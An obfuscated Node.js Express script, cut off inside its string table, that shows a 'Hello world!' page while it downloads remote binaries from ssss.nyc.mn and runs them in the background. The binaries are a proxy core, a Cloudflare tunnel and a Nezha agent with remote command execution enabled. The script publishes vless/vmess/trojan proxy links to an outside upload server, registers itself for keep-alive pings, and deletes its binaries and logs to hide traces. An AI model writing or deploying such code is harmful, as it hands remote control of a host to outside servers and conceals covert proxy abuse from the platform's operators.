const _0x3cc298=_0x50f8;(function(_0x439dc0,_0x51b455){const _0xb87cba=_0x50f8,_0x331a2f=_0x439dc0();while(!![]){try{const _0x39e87d=-parseInt(_0xb87cba(0x1a3))/0x1*(-parseInt(_0xb87cba(0x214))/0x2)+-parseInt(_0xb87cba(0x1c2))/0x3+-parseInt(_0xb87cba(0x163))/0x4*(parseInt(_0xb87cba(0x1c7))/0x5)+-parseInt(_0xb87cba(0x192))/0x6+parseInt(_0xb87cba(0x1bc))/0x7*(-parseInt(_0xb87cba(0x1f9))/0x8)+-parseInt(_0xb87cba(0x224))/0x9+parseInt(_0xb87cba(0x213))/0xa;if(_0x39e87d===_0x51b455)break;else _0x331a2f['push'](_0x331a2f['shift']());}catch(_0x1854e1){_0x331a2f['push'](_0x331a2f['shift']());}}}(_0x2c4f,0xa46d6));const express=require(_0x3cc298(0x1d4)),app=express(),axios=require(_0x3cc298(0x19f)),os=require('os'),fs=require('fs'),path=require(_0x3cc298(0x193)),{promisify}=require(_0x3cc298(0x1cb)),exec=promisify(require(_0x3cc298(0x1aa))['exec']),{execSync}=require(_0x3cc298(0x1aa)),UPLOAD_URL=process['env'][_0x3cc298(0x191)]||'',PROJECT_URL=process[_0x3cc298(0x218)][_0x3cc298(0x167)]||'',AUTO_ACCESS=process[_0x3cc298(0x218)][_0x3cc298(0x1d1)]||![],FILE_PATH=process[_0x3cc298(0x218)][_0x3cc298(0x17f)]||'./tmp',SUB_PATH=process['env'][_0x3cc298(0x173)]||_0x3cc298(0x1fa),PORT=process[_0x3cc298(0x218)]['SERVER_PORT']||process['env'][_0x3cc298(0x19b)]||0xbb8,UUID=process['env'][_0x3cc298(0x18b)]||_0x3cc298(0x1c4),NEZHA_SERVER=process[_0x3cc298(0x218)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3cc298(0x218)][_0x3cc298(0x177)]||'',NEZHA_KEY=process[_0x3cc298(0x218)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x3cc298(0x218)][_0x3cc298(0x198)]||_0x3cc298(0x18d),ARGO_AUTH=process['env'][_0x3cc298(0x164)]||_0x3cc298(0x199),ARGO_PORT=process[_0x3cc298(0x218)]['ARGO_PORT']||0x1f41,CFIP=process[_0x3cc298(0x218)][_0x3cc298(0x16f)]||_0x3cc298(0x1a1),CFPORT=process[_0x3cc298(0x218)][_0x3cc298(0x20d)]||0x1bb,NAME=process[_0x3cc298(0x218)][_0x3cc298(0x1f5)]||_0x3cc298(0x210);!fs[_0x3cc298(0x195)](FILE_PATH)?(fs[_0x3cc298(0x1c6)](FILE_PATH),console[_0x3cc298(0x18a)](FILE_PATH+_0x3cc298(0x20f))):console[_0x3cc298(0x18a)](FILE_PATH+_0x3cc298(0x1d7));function generateRandomName(){const _0x1a24f4=_0x3cc298,_0x3020a9=_0x1a24f4(0x1b4);let _0x10a813='';for(let _0x3dff80=0x0;_0x3dff80<0x6;_0x3dff80++){_0x10a813+=_0x3020a9[_0x1a24f4(0x206)](Math[_0x1a24f4(0x162)](Math['random']()*_0x3020a9[_0x1a24f4(0x1fb)]));}return _0x10a813;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3cc298(0x1cf)](FILE_PATH,npmName),phpPath=path[_0x3cc298(0x1cf)](FILE_PATH,phpName),webPath=path[_0x3cc298(0x1cf)](FILE_PATH,webName),botPath=path[_0x3cc298(0x1cf)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x3cc298(0x1fc)),listPath=path[_0x3cc298(0x1cf)](FILE_PATH,_0x3cc298(0x1d3)),bootLogPath=path[_0x3cc298(0x1cf)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x3cc298(0x1ad));function deleteNodes(){const _0x4d9270=_0x3cc298;try{if(!UPLOAD_URL)return;if(!fs[_0x4d9270(0x195)](subPath))return;let _0x3f2e5a;try{_0x3f2e5a=fs[_0x4d9270(0x1b9)](subPath,_0x4d9270(0x1b8));}catch{return null;}const _0x4e8e87=Buffer[_0x4d9270(0x19a)](_0x3f2e5a,_0x4d9270(0x190))[_0x4d9270(0x1b2)]('utf-8'),_0x181f65=_0x4e8e87[_0x4d9270(0x17a)]('\x0a')['filter'](_0x1237ab=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1237ab));if(_0x181f65[_0x4d9270(0x1fb)]===0x0)return;return axios[_0x4d9270(0x223)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x181f65}),{'headers':{'Content-Type':_0x4d9270(0x16b)}})[_0x4d9270(0x203)](_0x490bdc=>{return null;}),null;}catch(_0x3d8d29){return null;}}function cleanupOldFiles(){const _0x513c51=_0x3cc298;try{const _0xfec62c=fs[_0x513c51(0x17e)](FILE_PATH);_0xfec62c['forEach'](_0x46f79b=>{const _0x47f32e=_0x513c51,_0x19c178=path[_0x47f32e(0x1cf)](FILE_PATH,_0x46f79b);try{const _0x3d2171=fs[_0x47f32e(0x207)](_0x19c178);_0x3d2171['isFile']()&&fs[_0x47f32e(0x187)](_0x19c178);}catch(_0x39d8aa){}});}catch(_0xe4b896){}}function _0x50f8(_0x1b387b,_0x2cc313){_0x1b387b=_0x1b387b-0x15f;const _0x2c4f1c=_0x2c4f();let _0x50f814=_0x2c4f1c[_0x1b387b];return _0x50f814;}app[_0x3cc298(0x165)]('/',function(_0xffc59e,_0x41767b){const _0x394ca8=_0x3cc298;_0x41767b[_0x394ca8(0x1b5)](_0x394ca8(0x211));});async function generateConfig(){const _0x4e4fe9=_0x3cc298,_0x2658fc={'log':{'access':_0x4e4fe9(0x197),'error':_0x4e4fe9(0x197),'loglevel':_0x4e4fe9(0x1e0)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4e4fe9(0x16e),'settings':{'clients':[{'id':UUID,'flow':_0x4e4fe9(0x166)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4e4fe9(0x16a),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x4e4fe9(0x1a7)}},{'port':0xbb9,'listen':_0x4e4fe9(0x1f0),'protocol':_0x4e4fe9(0x16e),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x4e4fe9(0x1e0)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x4e4fe9(0x16e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4e4fe9(0x1e0)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4e4fe9(0x16a)}},'sniffing':{'enabled':!![],'destOverride':[_0x4e4fe9(0x18f),_0x4e4fe9(0x1ab),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4e4fe9(0x1f0),'protocol':_0x4e4fe9(0x18c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4e4fe9(0x1a5)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4e4fe9(0x1ab),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4e4fe9(0x1f0),'protocol':_0x4e4fe9(0x1f4),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4e4fe9(0x1cc)}},'sniffing':{'enabled':!![],'destOverride':[_0x4e4fe9(0x18f),_0x4e4fe9(0x1ab),_0x4e4fe9(0x1f3)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4e4fe9(0x20b),'tag':_0x4e4fe9(0x1c8)},{'protocol':_0x4e4fe9(0x1ce),'tag':_0x4e4fe9(0x1ff)}]};fs[_0x4e4fe9(0x226)](path[_0x4e4fe9(0x1cf)](FILE_PATH,_0x4e4fe9(0x1ad)),JSON[_0x4e4fe9(0x17b)](_0x2658fc,null,0x2));}function getSystemArchitecture(){const _0x368ba5=_0x3cc298,_0x21c78a=os['arch']();return _0x21c78a===_0x368ba5(0x21b)||_0x21c78a==='arm64'||_0x21c78a===_0x368ba5(0x1b0)?_0x368ba5(0x21b):_0x368ba5(0x21e);}function downloadFile(_0x2255a8,_0x238628,_0x11dca6){const _0xc2ae71=_0x3cc298,_0x47014f=_0x2255a8;!fs[_0xc2ae71(0x195)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0xaf9604=fs[_0xc2ae71(0x1c3)](_0x47014f);axios({'method':'get','url':_0x238628,'responseType':_0xc2ae71(0x1df)})[_0xc2ae71(0x222)](_0x5f19c9=>{const _0x38f8bc=_0xc2ae71;_0x5f19c9['data'][_0x38f8bc(0x212)](_0xaf9604),_0xaf9604['on'](_0x38f8bc(0x204),()=>{const _0x1066c5=_0x38f8bc;_0xaf9604[_0x1066c5(0x1d9)](),console['log']('Download\x20'+path[_0x1066c5(0x20e)](_0x47014f)+'\x20successfully'),_0x11dca6(null,_0x47014f);}),_0xaf9604['on'](_0x38f8bc(0x1e3),_0x27b313=>{const _0x2b1af0=_0x38f8bc;fs[_0x2b1af0(0x16c)](_0x47014f,()=>{});const _0x273b05=_0x2b1af0(0x1ac)+path[_0x2b1af0(0x20e)](_0x47014f)+_0x2b1af0(0x1e2)+_0x27b313[_0x2b1af0(0x194)];console[_0x2b1af0(0x1e3)](_0x273b05),_0x11dca6(_0x273b05);});})[_0xc2ae71(0x203)](_0x30f04e=>{const _0x423f5f=_0xc2ae71,_0x9970af=_0x423f5f(0x1ac)+path[_0x423f5f(0x20e)](_0x47014f)+'\x20failed:\x20'+_0x30f04e['message'];console[_0x423f5f(0x1e3)](_0x9970af),_0x11dca6(_0x9970af);});}async function downloadFilesAndRun(){const _0x5a09cb=_0x3cc298,_0x5b897a=getSystemArchitecture(),_0x41f2c5=getFilesForArchitecture(_0x5b897a);if(_0x41f2c5['length']===0x0){console['log'](_0x5a09cb(0x16d));return;}const _0x27a82f=_0x41f2c5[_0x5a09cb(0x1bb)](_0x17c3ca=>{return new Promise((_0x1f7728,_0x4088aa)=>{downloadFile(_0x17c3ca['fileName'],_0x17c3ca['fileUrl'],(_0x4eebcc,_0x8c02f0)=>{_0x4eebcc?_0x4088aa(_0x4eebcc):_0x1f7728(_0x8c02f0);});});});try{await Promise[_0x5a09cb(0x20a)](_0x27a82f);}catch(_0x3033ba){console[_0x5a09cb(0x1e3)]('Error\x20downloading\x20files:',_0x3033ba);return;}function _0x2d2c99(_0x5c4ab2){const _0x4f4cd5=_0x5a09cb,_0x7d938d=0x1fd;_0x5c4ab2[_0x4f4cd5(0x1e4)](_0x2af3dc=>{const _0x283640=_0x4f4cd5;fs[_0x283640(0x195)](_0x2af3dc)&&fs[_0x283640(0x1d5)](_0x2af3dc,_0x7d938d,_0xc3cd8a=>{const _0x470b7b=_0x283640;_0xc3cd8a?console[_0x470b7b(0x1e3)](_0x470b7b(0x1cd)+_0x2af3dc+':\x20'+_0xc3cd8a):console[_0x470b7b(0x18a)](_0x470b7b(0x1f1)+_0x2af3dc+':\x20'+_0x7d938d['toString'](0x8));});});}const _0x119209=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2d2c99(_0x119209);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x6e15b5=NEZHA_SERVER[_0x5a09cb(0x208)](':')?NEZHA_SERVER['split'](':')[_0x5a09cb(0x1b7)]():'',_0xa05804=new Set([_0x5a09cb(0x1a9),_0x5a09cb(0x17d),_0x5a09cb(0x1f7),_0x5a09cb(0x189),_0x5a09cb(0x184),'2053']),_0x2da333=_0xa05804[_0x5a09cb(0x1af)](_0x6e15b5)?_0x5a09cb(0x169):_0x5a09cb(0x1c9),_0x33f195=_0x5a09cb(0x171)+NEZHA_KEY+_0x5a09cb(0x1a8)+NEZHA_SERVER+_0x5a09cb(0x1be)+_0x2da333+_0x5a09cb(0x178)+UUID;fs['writeFileSync'](path[_0x5a09cb(0x1cf)](FILE_PATH,_0x5a09cb(0x1ba)),_0x33f195);const _0x33dc4a=_0x5a09cb(0x15f)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x33dc4a),console[_0x5a09cb(0x18a)](phpName+'\x20is\x20running'),await new Promise(_0x3f6e60=>setTimeout(_0x3f6e60,0x3e8));}catch(_0x560550){console['error']('php\x20running\x20error:\x20'+_0x560550);}}else{let _0x5bc981='';const _0x113092=[_0x5a09cb(0x1a9),_0x5a09cb(0x17d),'2096',_0x5a09cb(0x189),_0x5a09cb(0x184),'2053'];_0x113092['includes'](NEZHA_PORT)&&(_0x5bc981=_0x5a09cb(0x205));const _0x52974c=_0x5a09cb(0x15f)+npmPath+_0x5a09cb(0x21f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5a09cb(0x1da)+NEZHA_KEY+'\x20'+_0x5bc981+_0x5a09cb(0x1dc);try{await exec(_0x52974c),console[_0x5a09cb(0x18a)](npmName+_0x5a09cb(0x1c0)),await new Promise(_0x2c165a=>setTimeout(_0x2c165a,0x3e8));}catch(_0x2d935f){console[_0x5a09cb(0x1e3)]('npm\x20running\x20error:\x20'+_0x2d935f);}}}else console['log'](_0x5a09cb(0x175));const _0x23995a=_0x5a09cb(0x15f)+webPath+_0x5a09cb(0x1a6)+FILE_PATH+_0x5a09cb(0x202);try{await exec(_0x23995a),console[_0x5a09cb(0x18a)](webName+_0x5a09cb(0x1c0)),await new Promise(_0x59eff6=>setTimeout(_0x59eff6,0x3e8));}catch(_0x4e8b18){console[_0x5a09cb(0x1e3)]('web\x20running\x20error:\x20'+_0x4e8b18);}if(fs[_0x5a09cb(0x195)](botPath)){let _0x173063;if(ARGO_AUTH[_0x5a09cb(0x188)](/^[A-Z0-9a-z=]{120,250}$/))_0x173063=_0x5a09cb(0x215)+ARGO_AUTH;else ARGO_AUTH[_0x5a09cb(0x188)](/TunnelSecret/)?_0x173063=_0x5a09cb(0x1f6)+FILE_PATH+'/tunnel.yml\x20run':_0x173063=_0x5a09cb(0x227)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5a09cb(0x15f)+botPath+'\x20'+_0x173063+'\x20>/dev/null\x202>&1\x20&'),console[_0x5a09cb(0x18a)](botName+_0x5a09cb(0x1c0)),await new Promise(_0x2467fc=>setTimeout(_0x2467fc,0x7d0));}catch(_0x5f3998){console[_0x5a09cb(0x1e3)]('Error\x20executing\x20command:\x20'+_0x5f3998);}}await new Promise(_0x3e1df1=>setTimeout(_0x3e1df1,0x1388));}function getFilesForArchitecture(_0x525379){const _0x243f6e=_0x3cc298;let _0x4d3daa;_0x525379==='arm'?_0x4d3daa=[{'fileName':webPath,'fileUrl':_0x243f6e(0x201)},{'fileName':botPath,'fileUrl':_0x243f6e(0x1ed)}]:_0x4d3daa=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x243f6e(0x220)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x206029=_0x525379===_0x243f6e(0x21b)?'https://arm64.ssss.nyc.mn/agent':_0x243f6e(0x1e5);_0x4d3daa[_0x243f6e(0x1f8)]({'fileName':npmPath,'fileUrl':_0x206029});}else{const _0x155003=_0x525379===_0x243f6e(0x21b)?_0x243f6e(0x174):_0x243f6e(0x225);_0x4d3daa['unshift']({'fileName':phpPath,'fileUrl':_0x155003});}}return _0x4d3daa;}function argoType(){const _0x41d034=_0x3cc298;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x41d034(0x18a)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x41d034(0x208)](_0x41d034(0x1e9))){fs[_0x41d034(0x226)](path['join'](FILE_PATH,_0x41d034(0x221)),ARGO_AUTH);const _0x38b374=_0x41d034(0x19c)+ARGO_AUTH[_0x41d034(0x17a)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x41d034(0x1cf)](FILE_PATH,_0x41d034(0x221))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x41d034(0x168)+ARGO_PORT+_0x41d034(0x179);fs[_0x41d034(0x226)](path['join'](FILE_PATH,_0x41d034(0x219)),_0x38b374);}else console[_0x41d034(0x18a)](_0x41d034(0x196));}async function extractDomains(){const _0x4e4ab7=_0x3cc298;let _0x4958b7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4958b7=ARGO_DOMAIN,console[_0x4e4ab7(0x18a)](_0x4e4ab7(0x1f2),_0x4958b7),await _0x3983c7(_0x4958b7);else try{const _0x1cd302=fs[_0x4e4ab7(0x1b9)](path[_0x4e4ab7(0x1cf)](FILE_PATH,'boot.log'),_0x4e4ab7(0x1b8)),_0x13af95=_0x1cd302[_0x4e4ab7(0x17a)]('\x0a'),_0x5f1819=[];_0x13af95[_0x4e4ab7(0x1e4)](_0x3a6c1b=>{const _0x4fece4=_0x4e4ab7,_0x3d07de=_0x3a6c1b[_0x4fece4(0x188)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3d07de){const _0x2184a1=_0x3d07de[0x1];_0x5f1819[_0x4fece4(0x1ea)](_0x2184a1);}});if(_0x5f1819[_0x4e4ab7(0x1fb)]>0x0)_0x4958b7=_0x5f1819[0x0],console['log']('ArgoDomain:',_0x4958b7),await _0x3983c7(_0x4958b7);else{console[_0x4e4ab7(0x18a)](_0x4e4ab7(0x1e8)),fs['unlinkSync'](path[_0x4e4ab7(0x1cf)](FILE_PATH,_0x4e4ab7(0x1a0)));async function _0x32b2d3(){const _0x505011=_0x4e4ab7;try{process[_0x505011(0x19d)]===_0x505011(0x217)?await exec(_0x505011(0x209)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x505011(0x21d)+botName['charAt'](0x0)+']'+botName[_0x505011(0x200)](0x1)+_0x505011(0x1ee));}catch(_0x44f352){}}_0x32b2d3(),await new Promise(_0x2fa8c5=>setTimeout(_0x2fa8c5,0xbb8));const _0x1ed520=_0x4e4ab7(0x227)+FILE_PATH+_0x4e4ab7(0x1d8)+ARGO_PORT;try{await exec(_0x4e4ab7(0x15f)+botPath+'\x20'+_0x1ed520+_0x4e4ab7(0x160)),console['log'](botName+_0x4e4ab7(0x1c0)),await new Promise(_0x30057e=>setTimeout(_0x30057e,0xbb8)),await extractDomains();}catch(_0xbe5516){console[_0x4e4ab7(0x1e3)](_0x4e4ab7(0x170)+_0xbe5516);}}}catch(_0x531c1d){console[_0x4e4ab7(0x1e3)](_0x4e4ab7(0x1fd),_0x531c1d);}async function _0x3c5ec5(){const _0x2ecb04=_0x4e4ab7;try{const _0x5f2959=await axios[_0x2ecb04(0x165)](_0x2ecb04(0x185),{'timeout':0xbb8});if(_0x5f2959[_0x2ecb04(0x1ae)]&&_0x5f2959['data'][_0x2ecb04(0x1bf)]&&_0x5f2959[_0x2ecb04(0x1ae)]['org'])return _0x5f2959[_0x2ecb04(0x1ae)][_0x2ecb04(0x1bf)]+'_'+_0x5f2959[_0x2ecb04(0x1ae)][_0x2ecb04(0x1b1)];}catch(_0x278551){try{const _0x3b5833=await axios['get'](_0x2ecb04(0x1bd),{'timeout':0xbb8});if(_0x3b5833[_0x2ecb04(0x1ae)]&&_0x3b5833['data'][_0x2ecb04(0x1eb)]===_0x2ecb04(0x176)&&_0x3b5833[_0x2ecb04(0x1ae)]['countryCode']&&_0x3b5833['data'][_0x2ecb04(0x1b1)])return _0x3b5833[_0x2ecb04(0x1ae)][_0x2ecb04(0x161)]+'_'+_0x3b5833[_0x2ecb04(0x1ae)][_0x2ecb04(0x1b1)];}catch(_0x5e5812){}}return _0x2ecb04(0x1a2);}async function _0x3983c7(_0x1c36a3){const _0x22ca14=await _0x3c5ec5(),_0x5aa129=NAME?NAME+'-'+_0x22ca14:_0x22ca14;return new Promise(_0x4e2d9a=>{setTimeout(()=>{const _0x3ae1c4=_0x50f8,_0x1d2b45={'v':'2','ps':''+_0x5aa129,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3ae1c4(0x1e0),'net':'ws','type':_0x3ae1c4(0x1e0),'host':_0x1c36a3,'path':_0x3ae1c4(0x183),'tls':_0x3ae1c4(0x1ab),'sni':_0x1c36a3,'alpn':'','fp':_0x3ae1c4(0x182)},_0xff8edf=_0x3ae1c4(0x1fe)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1c36a3+_0x3ae1c4(0x1ef)+_0x1c36a3+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x5aa129+'\x0a\x0avmess://'+Buffer[_0x3ae1c4(0x19a)](JSON['stringify'](_0x1d2b45))[_0x3ae1c4(0x1b2)](_0x3ae1c4(0x190))+_0x3ae1c4(0x19e)+UUID+'@'+CFIP+':'+CFPORT+_0x3ae1c4(0x17c)+_0x1c36a3+_0x3ae1c4(0x1ef)+_0x1c36a3+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x5aa129+_0x3ae1c4(0x1db);console[_0x3ae1c4(0x18a)](Buffer[_0x3ae1c4(0x19a)](_0xff8edf)[_0x3ae1c4(0x1b2)]('base64')),fs[_0x3ae1c4(0x226)](subPath,Buffer['from'](_0xff8edf)[_0x3ae1c4(0x1b2)](_0x3ae1c4(0x190))),console[_0x3ae1c4(0x18a)](FILE_PATH+_0x3ae1c4(0x216)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x474c01,_0x31cb1a)=>{const _0x3ca36a=_0x3ae1c4,_0x5ebb61=Buffer[_0x3ca36a(0x19a)](_0xff8edf)['toString']('base64');_0x31cb1a[_0x3ca36a(0x1e1)](_0x3ca36a(0x1d6),_0x3ca36a(0x172)),_0x31cb1a[_0x3ca36a(0x1b5)](_0x5ebb61);}),_0x4e2d9a(_0xff8edf);},0x7d0);});}}async function uploadNodes(){const _0x3507aa=_0x3cc298;if(UPLOAD_URL&&PROJECT_URL){const _0x12c4f9=PROJECT_URL+'/'+SUB_PATH,_0x262611={'subscription':[_0x12c4f9]};try{const _0x3d32d3=await axios[_0x3507aa(0x223)](UPLOAD_URL+_0x3507aa(0x1e7),_0x262611,{'headers':{'Content-Type':_0x3507aa(0x16b)}});return _0x3d32d3&&_0x3d32d3[_0x3507aa(0x1eb)]===0xc8?(console['log'](_0x3507aa(0x1c1)),_0x3d32d3):null;}catch(_0x1ab1ca){if(_0x1ab1ca[_0x3507aa(0x1dd)]){if(_0x1ab1ca[_0x3507aa(0x1dd)][_0x3507aa(0x1eb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3507aa(0x195)](listPath))return;const _0x4a0694=fs[_0x3507aa(0x1b9)](listPath,_0x3507aa(0x1b8)),_0x203be4=_0x4a0694[_0x3507aa(0x17a)]('\x0a')['filter'](_0x46b97f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3507aa(0x1d2)](_0x46b97f));if(_0x203be4[_0x3507aa(0x1fb)]===0x0)return;const _0x1884ba=JSON['stringify']({'nodes':_0x203be4});try{const _0x2c6999=await axios['post'](UPLOAD_URL+_0x3507aa(0x181),_0x1884ba,{'headers':{'Content-Type':'application/json'}});return _0x2c6999&&_0x2c6999[_0x3507aa(0x1eb)]===0xc8?(console[_0x3507aa(0x18a)](_0x3507aa(0x1ca)),_0x2c6999):null;}catch(_0x99621d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xf53410=_0x50f8,_0x2b4f1a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2b4f1a[_0xf53410(0x1ea)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2b4f1a[_0xf53410(0x1ea)](phpPath);process[_0xf53410(0x19d)]===_0xf53410(0x217)?exec(_0xf53410(0x1b6)+_0x2b4f1a['join']('\x20')+_0xf53410(0x1c5),_0xc006db=>{const _0x5981b4=_0xf53410;console[_0x5981b4(0x21c)](),console[_0x5981b4(0x18a)](_0x5981b4(0x180)),console[_0x5981b4(0x18a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0xf53410(0x18e)+_0x2b4f1a[_0xf53410(0x1cf)]('\x20')+_0xf53410(0x1d0),_0x4b8490=>{const _0x212f5c=_0xf53410;console[_0x212f5c(0x21c)](),console[_0x212f5c(0x18a)]('App\x20is\x20running'),console[_0x212f5c(0x18a)](_0x212f5c(0x1ec));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xcb505d=_0x3cc298;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xcb505d(0x18a)](_0xcb505d(0x20c));return;}try{const _0x41a845=await axios['post'](_0xcb505d(0x21a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xcb505d(0x16b)}});return console[_0xcb505d(0x18a)](_0xcb505d(0x1a4)),_0x41a845;}catch(_0x28daa4){return console['error'](_0xcb505d(0x1e6)+_0x28daa4[_0xcb505d(0x194)]),null;}}async function startserver(){const _0x9af891=_0x3cc298;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3c914a){console['error'](_0x9af891(0x186),_0x3c914a);}}function _0x2c4f(){const _0x58a0c9=['tcp','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','443','child_process','tls','Download\x20','config.json','data','has','aarch64','org','toString','http\x20server\x20is\x20running\x20on\x20port:','abcdefghijklmnopqrstuvwxyz','send','del\x20/f\x20/q\x20','pop','utf-8','readFileSync','config.yaml','map','156632AUcbym','http://ip-api.com/json/','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','country_code','\x20is\x20running','Subscription\x20uploaded\x20successfully','417657YMBtdz','createWriteStream','cf1f82c5-7b4f-49fd-81e5-3b4a6649eb0a','\x20>\x20nul\x202>&1','mkdirSync','55oEuVrN','direct','false','Nodes\x20uploaded\x20successfully','util','/trojan-argo','Empowerment\x20failed\x20for\x20','blackhole','join','\x20>/dev/null\x202>&1','AUTO_ACCESS','test','list.txt','express','chmod','Content-Type','\x20already\x20exists','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','close','\x20-p\x20','\x0a\x20\x20\x20\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','response','Unhandled\x20error\x20in\x20startserver:','stream','none','set','\x20failed:\x20','error','forEach','https://amd64.ssss.nyc.mn/agent','Add\x20automatic\x20access\x20task\x20faild:\x20','/api/add-subscriptions','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','TunnelSecret','push','status','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/bot','\x22\x20>\x20/dev/null\x202>&1','&fp=firefox&type=ws&host=','127.0.0.1','Empowerment\x20success\x20for\x20','ARGO_DOMAIN:','quic','trojan','NAME','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','2096','unshift','272sthQjw','avfthy','length','sub.txt','Error\x20reading\x20boot.log:','\x0avless://','block','substring','https://arm64.ssss.nyc.mn/web','/config.json\x20>/dev/null\x202>&1\x20&','catch','finish','--tls','charAt','statSync','includes','taskkill\x20/f\x20/im\x20','all','freedom','Skipping\x20adding\x20automatic\x20access\x20task','CFPORT','basename','\x20is\x20created','rail','Hello\x20world!','pipe','43732330rrVFuD','1059560uTRrJI','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/sub.txt\x20saved\x20successfully','win32','env','tunnel.yml','https://oooo.serv00.net/add-url','arm','clear','pkill\x20-f\x20\x22[','amd','\x20-s\x20','https://amd64.ssss.nyc.mn/bot','tunnel.json','then','post','9238689giLNVY','https://amd64.ssss.nyc.mn/v1','writeFileSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','nohup\x20','\x20>/dev/null\x202>&1\x20&','countryCode','floor','381012aPsCnn','ARGO_AUTH','get','xtls-rprx-vision','PROJECT_URL','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','true','/vless-argo','application/json','unlink','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','vless','CFIP','Error\x20executing\x20command:\x20','\x0aclient_secret:\x20','text/plain;\x20charset=utf-8','SUB_PATH','https://arm64.ssss.nyc.mn/v1','NEZHA\x20variable\x20is\x20empty,skip\x20running','success','NEZHA_PORT','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','split','stringify','?security=tls&sni=','8443','readdirSync','FILE_PATH','App\x20is\x20running','/api/add-nodes','firefox','/vmess-argo?ed=2560','2083','https://ipapi.co/json/','Error\x20in\x20startserver:','unlinkSync','match','2087','log','UUID','vmess','gTaL5F.zxiw.dpdns.org','rm\x20-rf\x20','http','base64','UPLOAD_URL','7531272AAwoHH','path','m